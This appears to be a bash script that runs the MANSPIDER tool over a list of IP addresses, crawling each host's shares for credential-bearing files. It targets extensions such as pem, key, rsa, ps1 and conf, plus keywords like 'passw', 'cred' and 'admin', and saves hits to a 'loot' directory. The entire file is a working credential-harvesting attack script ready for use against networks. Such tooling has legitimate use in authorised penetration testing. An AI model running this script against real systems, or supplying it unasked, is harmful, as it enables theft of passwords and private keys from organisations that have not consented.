#!/bin/bash

# Define the input file containing IP addresses
IP_FILE="spider-hosts.txt"

# Define the output directory for found items
LOOT_DIR="$HOME/manspider_loot"

# Define the file extensions and keywords to search for
FILE_EXTENSIONS="txt doc docx xls xlsx csv db bat com vbs ps1 psd1 psm1 pem key rsa pub reg cfg conf"
KEYWORDS="passw user admin account network login logon cred"

# Create the loot directory if it doesn't exist
mkdir -p "$LOOT_DIR"

# Check if the input file exists
if [ ! -f "$IP_FILE" ]; then
    echo "File not found: $IP_FILE"
    exit 1
fi

# Run MANSPIDER for each IP in the input file
while IFS= read -r ip; do
    manspider -t 20 $ip -l "$LOOT_DIR" -f "$KEYWORDS" -e "$FILE_EXTENSIONS"
done < "$IP_FILE"

echo "MANSPIDER search completed. Loot saved to $LOOT_DIR"
